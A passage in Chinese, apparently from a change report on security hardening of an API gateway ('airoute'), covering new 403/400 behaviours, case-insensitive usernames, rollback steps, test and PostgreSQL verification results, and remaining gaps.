   - 非管理员对 `admin_disabled=true` 的 key 置 `active` → **403**；批量启用会跳过这些行并回报跳过数（全被跳过时 403）。
   - 批量状态接口的非法 status 由「静默 active」变为 **400**；渠道单条/创建同理。前端若曾传 `"disable"` 之类拼写，会开始报错（这是期望行为）。
   - `status` 现在会做 `trim+lowercase` 归一后存储（`"ACTIVE"` → `"active"`）。
   - 登录/注册要求 `Content-Type: application/json`（浏览器控制台本就如此；`curl`/脚本需带 `-H 'Content-Type: application/json'`）。带 `Origin`/`Referer` 且与 `PUBLIC_URL`（未配置时比对请求 Host）不一致 → 403；**未配置 `PUBLIC_URL` 的反代部署**依赖请求 Host 比对，建议显式配置 `PUBLIC_URL`。
   - 用户名大小写不再区分：`Admin` 与 `admin` 视为同名（注册/建号拒绝，登录按不区分大小写命中同一账号）。
4. **回滚**：v44 的索引可 `DROP INDEX uq_users_username_lower` 回滚；v45 的列可保留（旧二进制忽略未知列）——SQLite 无法 `DROP COLUMN`（旧版），Postgres 可 `ALTER TABLE api_keys DROP COLUMN admin_disabled`。

### 6.3 质量门（修复后实测）

```
gofmt -l internal cmd web                       → 空
go build ./...                                  → OK
go vet ./...                                    → OK
go test -count=1 ./...                          → 16/16 包 ok
go test -count=1 -race ./internal/controlplane/ → ok (111.6s)
go test -count=1 -race ./internal/storage/ -skip TestUsageSpillReplayPicksUpAnotherProcessFile
                                                → ok (72.0s)
```

**真 PostgreSQL 验证**（临时容器 `postgres:16-alpine`，用后已删除；**未触碰**线上 `airoute-postgres`）：

```
AIROUTE_TEST_DATABASE_URL=postgres://…@127.0.0.1:55432/airoute_verify \
  go test -tags integration ./internal/storage/ -run TestPostgresMigrationsAndRepositoryRoundTrip
  → PASS；schema_migrations 记录 v44/v45
psql: \d api_keys → admin_disabled boolean not null default false
      pg_indexes   → uq_users_username_lower 存在
临时用例（跑完即删）验证：大小写变体用户名在 PG 被拒、GetUserByUsername 大小写不敏感命中、
admin_disabled 布尔列 INSERT/UPDATE/SELECT/K 前缀投影全链路、自助批量启用返回 0 行、
管理员批量启用生效并清标记 → 全部 PASS
```

> 说明：`TestUsageSpillReplayPicksUpAnotherProcessFile`（`internal/storage/usage_spill_replay_test.go`，**另一 teammate 的未跟踪文件**，属用量落盘重放域）只在 `-race` 下失败（`peer spill file was not replayed by the periodic pass: rows = 0`，5.4s 定时窗口），与本次改动无关（本次未触及 spill/replay/async logger）；非 `-race` 的 `go test ./...` 全绿。已同步 Lead。

### 6.4 仍未做 / 边界

- **未给 v44 冲突路径补自动化测试**：模拟「已有重复账号」需要一个已记录 v1–v43 且 `users` 表缺索引的库，构造成本高于收益；该路径已人工核对（`tableExists` 守卫 + 冲突查询 + 原样列出名字 + `errMigrationDeferred`），并在 §6.2 写明运维处置。`tableExists` 守卫另修掉了合成/遗留 fixture 库（v1–v28 已记录但无 `users` 表）下 v44 报 `no such table` 的问题。
- **`IsEmailVerificationRequired` 与注册顺序**未动。
- 前端未接 `admin_disabled`（本轮按要求不改 UI）；控制台当前仍只展示 `status`，两者在「管理员停用」时同时为 `disabled/true`。
